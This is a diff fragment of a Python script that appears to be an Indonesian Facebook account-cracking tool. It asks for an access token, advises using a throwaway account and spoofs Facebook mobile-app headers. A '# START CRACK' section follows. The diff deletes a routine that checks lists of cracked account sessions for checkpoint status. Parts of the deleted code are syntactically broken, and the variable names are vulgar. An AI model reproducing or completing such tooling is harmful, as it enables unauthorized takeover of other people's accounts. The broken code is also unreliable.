@@ -69,13 +69,13 @@ Presented%s \n_____             __        __
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def masuk():
     os.system('clear');banner()
-    print ('\n%s [01] Login via token \n [02] Cara mendapatkan token \n [%s00%s] Keluar'%(P,M,P))
+    print ('\n%s [01] Masuk Token \n [%s00%s] Keluar'%(P,M,P))
     rom = raw_input('\n%s [?] Menu : %s'%(P,K))
     if rom in(""):
     	print("%s [!] Isi yang benar "%(M));exit()
     elif rom in ('1','01'):
         jalan("\n%s [%s!%s] Dianjurkan Memakai Akun tumbal "%(P,M,P))
-    	romz = raw_input('%s [?] Token : %s'%(P,K))
+    	romz = raw_input('%s [!] Token : %s'%(P,K))
         if romz in(""):
         	print("%s [!] Isilah dengan cinta "%(M));exit()
     	try:
@@ -187,28 +187,6 @@ def postingan(romz,headers=header):
         menu()
     except Exception as e:
         exit('\n %s[!] gagal dump id'%(P))
-### Result Hasil
-def cek_opsi():
-	print(%s [%s•%s•%s] Masukan File sesi.txt"))'%(O,P,O)) 
-	files = input(%s [%s•%s•%s] File: ") '%(P,O,P,O)) 
-	if files == "":
-		cek_opsi()
-	try:
-		buka_baju = open(files, "r").readlines()
-	except IOError:
-		exit(%s" [%s•%s•%s] Files %s%s%s Tidak Ada!"%(h,files,p))
-	print(%s [%s•%s•%s] Total Account Sesi : "+str(len(buka_baju))) '%(P,O,P,O)) 
-	print(%s [%s•%s•%s] Check Opsi Checkpoint, Please Wait...") '%(P,O,P,O)) 
-	for memek in buka_baju:
-		kontol = memek.replace("\n","")
-		titid  = kontol.split(" • ")
-		print("\033[1;37m\n [\033[1;33m•\033[1;91m•\033[1;37m] "+kontol.replace(" + ",""))
-		try:
-			check_in(titid[0].replace(" + ",""), titid[1])
-		except requests.exceptions.ConnectionError:
-			pass
-	input("%s [Kembali]"%(p))
-	menu()
 # START CRACK
 class ngentod:
 
